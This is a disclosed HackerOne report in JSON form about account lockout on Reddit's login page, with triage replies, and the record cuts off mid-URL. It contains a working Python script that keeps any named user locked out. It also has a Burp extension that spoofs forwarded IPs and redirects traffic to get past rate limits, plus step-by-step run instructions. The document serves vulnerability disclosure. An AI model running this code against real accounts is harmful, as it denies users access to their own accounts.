@@ -1,0 +1,760 @@
+{
+    "id": 1582778,
+    "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTgyNzc4",
+    "url": "https://hackerone.com/reports/1582778",
+    "title": "Misconfigurated login page able to lock login action for any account without user interaction",
+    "state": "Closed",
+    "substate": "informative",
+    "severity_rating": "critical",
+    "readable_substate": "Informative",
+    "created_at": "2022-05-27T10:17:28.834Z",
+    "submitted_at": "2022-05-27T10:17:28.931Z",
+    "is_member_of_team?": false,
+    "is_organization_group_member?": false,
+    "reporter": {
+        "disabled": false,
+        "username": "ug0x01",
+        "url": "/ug0x01",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/tx46va61kxpoevwva5yst4hiw755/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+        },
+        "is_me?": false,
+        "cleared": false,
+        "verified": false,
+        "hackerone_triager": false,
+        "hacker_mediation": false
+    },
+    "team": {
+        "id": 35710,
+        "url": "https://hackerone.com/reddit",
+        "handle": "reddit",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/710/c1ae53147a025b33b7c8383200432c8b4a9b839a_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+            "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/710/c1ae53147a025b33b7c8383200432c8b4a9b839a_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "permissions": [],
+        "submission_state": "open",
+        "default_currency": "usd",
+        "awards_miles": false,
+        "offers_bounties": true,
+        "state": "public_mode",
+        "only_cleared_hackers": false,
+        "pentest_feature_enabled?": false,
+        "profile": {
+            "name": "Reddit",
+            "twitter_handle": "reddit",
+            "website": "https://www.reddit.com",
+            "about": ""
+        }
+    },
+    "has_bounty?": false,
+    "in_validation?": false,
+    "can_view_team": true,
+    "can_view_report": true,
+    "is_external_bug": false,
+    "is_published": false,
+    "is_participant": false,
+    "has_collaborators": false,
+    "submitted_by_team_member": false,
+    "stage": 4,
+    "public": true,
+    "visibility": "full",
+    "cve_ids": [],
+    "singular_disclosure_disabled": true,
+    "disclosed_at": "2022-06-06T23:10:51.121Z",
+    "bug_reporter_agreed_on_going_public_at": "2022-06-01T14:07:03.125Z",
+    "team_member_agreed_on_going_public_at": "2022-06-06T23:10:50.997Z",
+    "comments_closed?": false,
+    "facebook_team?": false,
+    "team_private?": false,
+    "vulnerability_information": "## Summary\nWhile observing a few things about the login feature, I found that the account was locked after a certain number of requests. Although this feature is actually added to prevent problems such as rate limit, it is open to account lock attacks by attackers.\n\n## PoC\n1. Save this code as `exploit.py`:\n\n```\n#!/bin/python3\n\nfrom requests import get, post\nfrom sys import argv\nfrom warnings import filterwarnings\nfrom time import sleep\nfrom concurrent.futures import ThreadPoolExecutor\n\nfilterwarnings(\"ignore\")\n\ndef get_creds():\n    res = get(\"https://www.reddit.com/login/?experiment_d2x_2020ify_buttons=enabled&experiment_d2x_sso_login_link=enabled&experiment_d2x_google_sso_gis_parity=enabled&experiment_d2x_onboarding=enabled\")\n    \n    csrf_token = res.text.split('name=\"csrf_token\" value=\"')[1].split('\">')[0]\n    \n    return res.cookies.get_dict(), csrf_token\n\ndef lock_account(account, cookie, csrf_token):\n    post(\"https://www.reddit.com/login\", cookies=cookie, proxies={\"http\": \"http://127.0.0.1:8080\", \"https\": \"http://127.0.0.1:8080\"}, data={\"csrf_token\": csrf_token, \"otp\": '', \"password\": \"asdasdasasdasd231321d\", \"dest\": \"https://www.reddit.com\", \"username\": account}, headers={\"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\", \"Accept\": \"*/*\", \"Accept-Language\": \"en-US,en;q=0.5\", \"Accept-Encoding\": \"gzip, deflate\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"Origin\": \"https://www.reddit.com\", \"Sec-Fetch-Dest\": \"empty\", \"Sec-Fetch-Mode\": \"cors\", \"Sec-Fetch-Site\": \"same-origin\", \"Referer\": \"https://www.reddit.com/login/?experiment_d2x_2020ify_buttons=enabled&experiment_d2x_sso_login_link=enabled&experiment_d2x_google_sso_gis_parity=enabled&experiment_d2x_onboarding=enabled\", \"Connection\": \"close\"}, verify=False)\n\ncookie, csrf_token = get_creds()\n    \nfor _ in range(14):\n    ThreadPoolExecutor(max_workers=15).submit(lock_account, str(argv[1]), cookie, csrf_token)\n\nprint(\"Account Locked!!\")\n        \nsleep(60)\n    \nwhile True:\n    cookie, csrf_token = get_creds()\n    \n    for _ in range(14):\n        ThreadPoolExecutor(max_workers=15).submit(lock_account, str(argv[1]), cookie, csrf_token)\n        \n    sleep(60)\n```\n2. Save this code as `helper.py`:\n```\nfrom burp import IBurpExtender\nfrom burp import IHttpListener\n\nimport random\nimport socket\nimport struct\n\nHOST_FROM = \"www.reddit.com\"\nHOST_TO = \"ugroon.link\"\n\nclass BurpExtender(IBurpExtender, IHttpListener):\n    def registerExtenderCallbacks(self, callbacks):\n        self._helpers = callbacks.getHelpers()\n        \n        callbacks.setExtensionName(\"Traffic redirector\")\n        callbacks.registerHttpListener(self)\n\n    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):\n        helpers = self._helpers\n        if not messageIsRequest:\n            return\n        httpService = messageInfo.getHttpService()\n\n        if (HOST_FROM == httpService.getHost()):\n            message = helpers.bytesToString(messageInfo.getRequest())\n            message = message.replace(\"Host: \" + HOST_FROM, \"Host: \" + HOST_TO)\n            message_array = message.split(\"\\n\")\n            random_ip = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))\n            message_array.insert(3, \"X-My-X-Forwarded-For: \" + random_ip)\n            message = \"\\n\".join(message_array)\n            \n            print(message)\n            \n            message = helpers.stringToBytes(message)\n            messageInfo.setHttpService(self._helpers.buildHttpService(HOST_TO,httpService.getPort(),httpService.getProtocol()))\n\n```\n3. Download jython 2.7.0 (http://search.maven.org/remotecontent?filepath=org/python/jython-standalone/2.7.0/jython-standalone-2.7.0.jar)\n4. Download a burp which is older than 2021 version (new versions giving too many errors)\n5. Set jython 2.7.0 with `Extender > Options > Python Environment > Location of Jython standalone JAR file > jython 2.7.0 location`\n6. Upload `helper.py` to extensions with `Extender >  Extensions > Burp Extensions > Add > helper.py location`\n7. If you use linux, use `chmod +x exploit.py` for set permissions. But if you use windows, directly go to path and do next step\n8. Run the exploit with `python3 exploit.py usernameofvictim` and that's all.\n9. And for check to exploit work or not, try to login victim account on another device or change IP address and use a different browser for 0 track and you will see it's impossible to login account.\n\n##PoC video\n\n{F1746674}\n\n#Suggested Solutions\nTo avoid issues like rate limit, use protections like captcha instead of using such protection\n\n##Notes\n1. On the login screen it says the account has been locked for 5 minutes. However, the exploit restarts the attack every 5 minutes, so victim can \"never\" login into the victim account (added for avoid misunderstandings)\n2. If you have any questions or what you think is wrong with the report/impact, please mark it as needs more info before closing the report and let me answer your questions.\n\nCheers,\n@h1ugroon\n\n## Impact\n\nOnce the attacker starts the attack for the victim account, victim will never be able to login his/her account until the attacker stops the attack.",
+    "original_report_id": null,
+    "original_report_url": null,
+    "attachments": [
+        {
+            "id": 1746674,
+            "file_name": "recording-1653645412706.webm",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/h11p01gfdkpfho5z7qc53fu0w148?response-content-disposition=attachment%3B%20filename%3D%22recording-1653645412706.webm%22%3B%20filename%2A%3DUTF-8%27%27recording-1653645412706.webm&response-content-type=video%2Fwebm&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYY3KUHY6%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070203Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDbZ%2FrzMJPkXzqJKGhUDJxaKvRKOwgW3L9NoGgTQYNluwIgP%2FQUNBim5xYJkBE4bibyDr4jMY%2FqMgU8yTBdR9QfoSQquwUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDDEZLUDtzsol34pf1yqPBZq6rwka9dcUmP1Z24HNrPUaSjikKtPCd8tWm8aqp4p6845zp81qitLzXk9PwD9slj3c%2BSQSWjztZWIJEXZWIIlCQ8zW3V0YeF%2BPbkNoqrw1iHYiPAXC3t9y2cnp7uesZte%2B5t1Hb%2BbmTSUMQfTPsazLeu4nH%2F9MWkcvLY34rjH54kSRBSKoSpNPgPj2kSMe0Agn9jQ102utMKoMlhVvvqtnQmOO3yY83c9MPBbCmAsuXLoVvwRyAURznumXGaAY8T%2B16canJngAP7ML%2BGxqR9a4ioL%2FIEyZSARvH%2BOf1TL1KtnyqLRmKVMht7VNGhWu30mxL%2BAZvsBaOHSbngtEExTFVCGCjgA2bXH0nM7V4nVzgSBjnCm4xHKwlKw2UGiCKE1jyfYLNBgBnjuBeFtvw%2FIXEVAwP1X%2BGxr%2BBJEndKkov5kap4UxeFIHzwNu%2BuncV7Htjx%2B5Ceg3lS1dVXtigyLqfWS9ZDcUOzUU8a%2Bc2xMZW9%2FDGUXGEivZ6wchu7US3C7TYxKEqYefV4bC7u%2BQO8geofYjAWDWujYfUQPfe2CWBUQKd0IbyyY8dVsRqXxXquWP2PWT6zzBxgu8QOuklVxDBrNLKbnQ5Xm9tuf3xELeqIHfe%2BGfDIpigjAR4iago3Vsz8V7gdnhQUBe4ae8zi26qOx8xVbJBK3TtN9dyjtmyAO%2BWWqtf2WMN8S7GtgDCOEzmPtLc6hxX9Olifu0uGtBRSb0zE0EOX16pUQ7%2FFcPTQsSLqJC4c33cv%2BYTmjfyDDgUNUS4WbOmU0UwWv4bnaXCRIk8v9ZvvpaPfvZC1lx6k6alXR4GMigA2XBEFD852wBKdWpfiKe%2B4KEwnLNAeKE4xXaAmclAQBS8jFTLsYwsJ62pwY6sQHyCoWizkYjoXsyfeuh51YDF9e38C97iPYDjIXpJSSm1TTtLU%2FTGWnKeQisJw%2FcC8RKX7KKsFxYNATPCKUXKb05GVgEvZvvRtb71Ou3fUQO2phoABIv%2FguN%2BQLZIk23gYhvoCnzlJyh%2Bs4YT4Y9NBe%2BuO50gRcLkId0hIDo3s3rVFEHd3DeobVXe7TJmQ%2FoPHXywJmCBc5i%2FnGGtc8UW4nb1QByAu4MMgRtTUGscF6wF9Q%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=4eccfde2c25d9d92529ec928e65f65f7284625897d12090c9b548ba77fee6aa7",
+            "file_size": 59251341,
+            "type": "video/webm"
+        }
+    ],
+    "allow_singular_disclosure_at": null,
+    "vote_count": 15,
+    "voters": [
+        "0xm5awy",
+        "shelled",
+        "zy9ard3",
+        "renekroka",
+        "ug0x01",
+        "shivammusic",
+        "bollwide",
+        "rewiev",
+        "leqtuer",
+        "pawan_hacker",
+        "and 5 more..."
+    ],
+    "severity": {
+        "rating": "critical",
+        "score": 9.3,
+        "author_type": "User",
+        "metrics": {
+            "attack_vector": "network",
+            "attack_complexity": "low",
+            "privileges_required": "none",
+            "user_interaction": "none",
+            "scope": "unchanged",
+            "confidentiality": "none",
+            "integrity": "none",
+            "availability": "high"
+        }
+    },
+    "structured_scope": {
+        "databaseId": 18825,
+        "asset_type": "URL",
+        "asset_identifier": "www.reddit.com",
+        "max_severity": "critical"
+    },
+    "abilities": {
+        "assignable_team_members": [],
+        "assignable_team_member_groups": []
+    },
+    "activities": [
+        {
+            "id": 16901783,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "{F1748443}\n\nSo, any update?",
+            "automated_response": false,
+            "created_at": "2022-05-29T08:48:19.999Z",
+            "updated_at": "2022-05-29T08:48:19.999Z",
+            "actor": {
+                "username": "ug0x01",
+                "cleared": false,
+                "verified": false,
+                "url": "/ug0x01",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/tx46va61kxpoevwva5yst4hiw755/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "attachments": [
+                {
+                    "id": 1748443,
+                    "filename": "p.png",
+                    "type": "image/png",
+                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/up50dmxcobvsarhhaekprs5ll6u7?response-content-disposition=attachment%3B%20filename%3D%22p.png%22%3B%20filename%2A%3DUTF-8%27%27p.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYY3KUHY6%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070203Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDbZ%2FrzMJPkXzqJKGhUDJxaKvRKOwgW3L9NoGgTQYNluwIgP%2FQUNBim5xYJkBE4bibyDr4jMY%2FqMgU8yTBdR9QfoSQquwUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDDEZLUDtzsol34pf1yqPBZq6rwka9dcUmP1Z24HNrPUaSjikKtPCd8tWm8aqp4p6845zp81qitLzXk9PwD9slj3c%2BSQSWjztZWIJEXZWIIlCQ8zW3V0YeF%2BPbkNoqrw1iHYiPAXC3t9y2cnp7uesZte%2B5t1Hb%2BbmTSUMQfTPsazLeu4nH%2F9MWkcvLY34rjH54kSRBSKoSpNPgPj2kSMe0Agn9jQ102utMKoMlhVvvqtnQmOO3yY83c9MPBbCmAsuXLoVvwRyAURznumXGaAY8T%2B16canJngAP7ML%2BGxqR9a4ioL%2FIEyZSARvH%2BOf1TL1KtnyqLRmKVMht7VNGhWu30mxL%2BAZvsBaOHSbngtEExTFVCGCjgA2bXH0nM7V4nVzgSBjnCm4xHKwlKw2UGiCKE1jyfYLNBgBnjuBeFtvw%2FIXEVAwP1X%2BGxr%2BBJEndKkov5kap4UxeFIHzwNu%2BuncV7Htjx%2B5Ceg3lS1dVXtigyLqfWS9ZDcUOzUU8a%2Bc2xMZW9%2FDGUXGEivZ6wchu7US3C7TYxKEqYefV4bC7u%2BQO8geofYjAWDWujYfUQPfe2CWBUQKd0IbyyY8dVsRqXxXquWP2PWT6zzBxgu8QOuklVxDBrNLKbnQ5Xm9tuf3xELeqIHfe%2BGfDIpigjAR4iago3Vsz8V7gdnhQUBe4ae8zi26qOx8xVbJBK3TtN9dyjtmyAO%2BWWqtf2WMN8S7GtgDCOEzmPtLc6hxX9Olifu0uGtBRSb0zE0EOX16pUQ7%2FFcPTQsSLqJC4c33cv%2BYTmjfyDDgUNUS4WbOmU0UwWv4bnaXCRIk8v9ZvvpaPfvZC1lx6k6alXR4GMigA2XBEFD852wBKdWpfiKe%2B4KEwnLNAeKE4xXaAmclAQBS8jFTLsYwsJ62pwY6sQHyCoWizkYjoXsyfeuh51YDF9e38C97iPYDjIXpJSSm1TTtLU%2FTGWnKeQisJw%2FcC8RKX7KKsFxYNATPCKUXKb05GVgEvZvvRtb71Ou3fUQO2phoABIv%2FguN%2BQLZIk23gYhvoCnzlJyh%2Bs4YT4Y9NBe%2BuO50gRcLkId0hIDo3s3rVFEHd3DeobVXe7TJmQ%2FoPHXywJmCBc5i%2FnGGtc8UW4nb1QByAu4MMgRtTUGscF6wF9Q%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=02013b8a839172d58c79b732b463b7c0d71d84ed02bae1c6af0cc241af1a2823"
+                }
+            ],
+            "genius_execution_id": null,
+            "team_handle": "reddit"
+        },
+        {
+            "id": 16925373,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hi @h1ugroon,\n\nThank you for your submission. I hope you are well. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\n\nHave a great day! \n\nKind regards,\n@1nfinit3",
+            "automated_response": false,
+            "created_at": "2022-05-31T05:03:57.037Z",
+            "updated_at": "2022-05-31T05:03:57.037Z",
+            "actor": {
+                "username": "h1_analyst_arthur",
+                "cleared": false,
+                "verified": false,
+                "url": "/h1_analyst_arthur",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/m2p2sd5s5t1bcgg4ux4hi0wqn2bw/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "reddit"
+        },
+        {
+            "id": 16925405,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugInformative",
+            "message": "Hey @h1ugroon,\n\nThank you for your report!\n\nAfter review, there doesn’t seem to be any security risk and/or security impact as a result of the behavior you are describing.\n\nThe application has implemented a rate-limiting which is working correctly. The account lockout is not permanent and can be unlocked by the user. It looks that the error you are getting is due to rate limit is triggered after X attempts and your IP has been restricted from accessing that account. If you can show a permanent lockout to user’s account or the user’s account requiring support help to unban their account, I will re-evaluate this report.\n\nAs a result, we will be closing this report as informative. If you are able to leverage this into a practical exploitation scenario, we will be happy to reevaluate this report.\n\nThis will not have any impact on your Signal or Reputation score. We appreciate your effort and look forward to seeing more reports from you in the future.\n\nKind regards,\n@1nfinit3",
+            "automated_response": false,
+            "created_at": "2022-05-31T05:07:59.950Z",
+            "updated_at": "2022-05-31T05:07:59.950Z",
+            "actor": {
+                "username": "h1_analyst_arthur",
+                "cleared": false,
+                "verified": false,
+                "url": "/h1_analyst_arthur",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/m2p2sd5s5t1bcgg4ux4hi0wqn2bw/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "reddit"
+        },
+        {
+            "id": 16928224,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hey @1nfinit3, thanks for your reply \n\n> The account lockout is not permanent and can be unlocked by the user\n\nUser can not unlock the account and also lockout is permanent.\n\n> It looks that the error you are getting is due to rate limit is triggered after X attempts and your IP has been restricted from accessing that account\n\nNo, each request is sent with a different IP address via helper.py. You can try it yourself, if you send over X requests, reddit will block your IP and will start to giving 429 but as what I said each request is sent with a different IP address via helper.py. So, then you can test it with helper.py.\n\n> If you can show a permanent lockout to user’s account\n\nPlease create a test account and give me username and then just let me show you what will be happened :)\n\nCheers,\n@h1ugroon ",
+            "automated_response": false,
+            "created_at": "2022-05-31T09:25:42.100Z",
+            "updated_at": "2022-05-31T09:26:31.078Z",
+            "actor": {
+                "username": "ug0x01",
+                "cleared": false,
+                "verified": false,
+                "url": "/ug0x01",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/tx46va61kxpoevwva5yst4hiw755/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "reddit"
+        },
+        {
+            "id": 16934368,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hello @h1ugroon, \n\nPlease use this email to carry out the attack: `1nfinit3@wearehackerone.com`\n\nBest,\n@1nfinit3",
+            "automated_response": false,
+            "created_at": "2022-05-31T17:37:46.305Z",
+            "updated_at": "2022-05-31T17:37:46.305Z",
+            "actor": {
+                "username": "h1_analyst_arthur",
+                "cleared": false,
+                "verified": false,
+                "url": "/h1_analyst_arthur",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/m2p2sd5s5t1bcgg4ux4hi0wqn2bw/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "reddit"
+        },
+        {
+            "id": 16934634,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hey @1nfinit3,\n\nJust username required for attack. So, can you send your username? If your username is `1nfinit3` please let me know\n\n{F1751654}\n\nBest Regards,\n@h1ugroon ",
+            "automated_response": false,
+            "created_at": "2022-05-31T18:08:15.734Z",
+            "updated_at": "2022-05-31T18:08:15.734Z",
+            "actor": {
+                "username": "ug0x01",
+                "cleared": false,
+                "verified": false,
+                "url": "/ug0x01",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/tx46va61kxpoevwva5yst4hiw755/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "attachments": [
+                {
+                    "id": 1751654,
+                    "filename": "unknown.png",
+                    "type": "image/png",
+                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/9p6gbtoh5p7d7mmgolzz4nqgjsm2?response-content-disposition=attachment%3B%20filename%3D%22unknown.png%22%3B%20filename%2A%3DUTF-8%27%27unknown.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYY3KUHY6%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070203Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDbZ%2FrzMJPkXzqJKGhUDJxaKvRKOwgW3L9NoGgTQYNluwIgP%2FQUNBim5xYJkBE4bibyDr4jMY%2FqMgU8yTBdR9QfoSQquwUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDDEZLUDtzsol34pf1yqPBZq6rwka9dcUmP1Z24HNrPUaSjikKtPCd8tWm8aqp4p6845zp81qitLzXk9PwD9slj3c%2BSQSWjztZWIJEXZWIIlCQ8zW3V0YeF%2BPbkNoqrw1iHYiPAXC3t9y2cnp7uesZte%2B5t1Hb%2BbmTSUMQfTPsazLeu4nH%2F9MWkcvLY34rjH54kSRBSKoSpNPgPj2kSMe0Agn9jQ102utMKoMlhVvvqtnQmOO3yY83c9MPBbCmAsuXLoVvwRyAURznumXGaAY8T%2B16canJngAP7ML%2BGxqR9a4ioL%2FIEyZSARvH%2BOf1TL1KtnyqLRmKVMht7VNGhWu30mxL%2BAZvsBaOHSbngtEExTFVCGCjgA2bXH0nM7V4nVzgSBjnCm4xHKwlKw2UGiCKE1jyfYLNBgBnjuBeFtvw%2FIXEVAwP1X%2BGxr%2BBJEndKkov5kap4UxeFIHzwNu%2BuncV7Htjx%2B5Ceg3lS1dVXtigyLqfWS9ZDcUOzUU8a%2Bc2xMZW9%2FDGUXGEivZ6wchu7US3C7TYxKEqYefV4bC7u%2BQO8geofYjAWDWujYfUQPfe2CWBUQKd0IbyyY8dVsRqXxXquWP2PWT6zzBxgu8QOuklVxDBrNLKbnQ5Xm9tuf3xELeqIHfe%2BGfDIpigjAR4iago3Vsz8V7gdnhQUBe4ae8zi26qOx8xVbJBK3TtN9dyjtmyAO%2BWWqtf2WMN8S7GtgDCOEzmPtLc6hxX9Olifu0uGtBRSb0zE0EOX16pUQ7%2FFcPTQsSLqJC4c33cv%2BYTmjfyDDgUNUS4WbOmU0UwWv4bnaXCRIk8v9ZvvpaPfvZC1lx6k6alXR4GMigA2XBEFD852wBKdWpfiKe%2B4KEwnLNAeKE4xXaAmclAQBS8jFTLsYwsJ62pwY6sQHyCoWizkYjoXsyfeuh51YDF9e38C97iPYDjIXpJSSm1TTtLU%2FTGWnKeQisJw%2FcC8RKX7KKsFxYNATPCKUXKb05GVgEvZvvRtb71Ou3fUQO2phoABIv%2FguN%2BQLZIk23gYhvoCnzlJyh%2Bs4YT4Y9NBe%2BuO50gRcLkId0hIDo3s3rVFEHd3DeobVXe7TJmQ%2FoPHXywJmCBc5i%2FnGGtc8UW4nb1QByAu4MMgRtTUGscF6wF9Q%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5dc0dbe1ff818282ce94d8bc50a1821ca09117bd10463799f4610c8836ab601f"
+                }
+            ],
+            "genius_execution_id": null,
+            "team_handle": "reddit"
+        },
+        {
+            "id": 16935595,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hello @h1ugroon, \n\nUsername is `1nfinit3_H1`. \n\nBest,\n@1nfinit3",
+            "automated_response": false,
+            "created_at": "2022-05-31T19:31:44.761Z",
+            "updated_at": "2022-05-31T19:31:44.761Z",
+            "actor": {
+                "username": "h1_analyst_arthur",
+                "cleared": false,
+                "verified": false,
+                "url": "/h1_analyst_arthur",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/m2p2sd5s5t1bcgg4ux4hi0wqn2bw/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "reddit"
+        },
+        {
+            "id": 16935706,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hey @1nfinit3,\n\nStarted attack and tried to login on 2 devices.\n\nThis is my device\n\n{F1751797}\n\nAnd this is my friend's device\n\n{F1751798}\n\nAfter verifying the issue, please let me know and I will stop the attack\n\nBest Regards,\n@h1ugroon ",
+            "automated_response": false,
+            "created_at": "2022-05-31T19:48:13.382Z",
+            "updated_at": "2022-05-31T19:48:13.382Z",
+            "actor": {
+                "username": "ug0x01",
+                "cleared": false,
+                "verified": false,
+                "url": "/ug0x01",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/tx46va61kxpoevwva5yst4hiw755/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "attachments": [
+                {
+                    "id": 1751798,
+                    "filename": "device2.png",
+                    "type": "image/png",
+                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/2fhb4575vwwwgcmnnox09lklh8mc?response-content-disposition=attachment%3B%20filename%3D%22device2.png%22%3B%20filename%2A%3DUTF-8%27%27device2.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYY3KUHY6%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070203Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDbZ%2FrzMJPkXzqJKGhUDJxaKvRKOwgW3L9NoGgTQYNluwIgP%2FQUNBim5xYJkBE4bibyDr4jMY%2FqMgU8yTBdR9QfoSQquwUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDDEZLUDtzsol34pf1yqPBZq6rwka9dcUmP1Z24HNrPUaSjikKtPCd8tWm8aqp4p6845zp81qitLzXk9PwD9slj3c%2BSQSWjztZWIJEXZWIIlCQ8zW3V0YeF%2BPbkNoqrw1iHYiPAXC3t9y2cnp7uesZte%2B5t1Hb%2BbmTSUMQfTPsazLeu4nH%2F9MWkcvLY34rjH54kSRBSKoSpNPgPj2kSMe0Agn9jQ102utMKoMlhVvvqtnQmOO3yY83c9MPBbCmAsuXLoVvwRyAURznumXGaAY8T%2B16canJngAP7ML%2BGxqR9a4ioL%2FIEyZSARvH%2BOf1TL1KtnyqLRmKVMht7VNGhWu30mxL%2BAZvsBaOHSbngtEExTFVCGCjgA2bXH0nM7V4nVzgSBjnCm4xHKwlKw2UGiCKE1jyfYLNBgBnjuBeFtvw%2FIXEVAwP1X%2BGxr%2BBJEndKkov5kap4UxeFIHzwNu%2BuncV7Htjx%2B5Ceg3lS1dVXtigyLqfWS9ZDcUOzUU8a%2Bc2xMZW9%2FDGUXGEivZ6wchu7US3C7TYxKEqYefV4bC7u%2BQO8geofYjAWDWujYfUQPfe2CWBUQKd0IbyyY8dVsRqXxXquWP2PWT6zzBxgu8QOuklVxDBrNLKbnQ5Xm9tuf3xELeqIHfe%2BGfDIpigjAR4iago3Vsz8V7gdnhQUBe4ae8zi26qOx8xVbJBK3TtN9dyjtmyAO%2BWWqtf2WMN8S7GtgDCOEzmPtLc6hxX9Olifu0uGtBRSb0zE0EOX16pUQ7%2FFcPTQsSLqJC4c33cv%2BYTmjfyDDgUNUS4WbOmU0UwWv4bnaXCRIk8v9ZvvpaPfvZC1lx6k6alXR4GMigA2XBEFD852wBKdWpfiKe%2B4KEwnLNAeKE4xXaAmclAQBS8jFTLsYwsJ62pwY6sQHyCoWizkYjoXsyfeuh51YDF9e38C97iPYDjIXpJSSm1TTtLU%2FTGWnKeQisJw%2FcC8RKX7KKsFxYNATPCKUXKb05GVgEvZvvRtb71Ou3fUQO2phoABIv%2FguN%2BQLZIk23gYhvoCnzlJyh%2Bs4YT4Y9NBe%2BuO50gRcLkId0hIDo3s3rVFEHd3DeobVXe7TJmQ%2FoPHXywJmCBc5i%2FnGGtc8UW4nb1QByAu4MMgRtTUGscF6wF9Q%3D&X-Amz-SignedHeaders=hos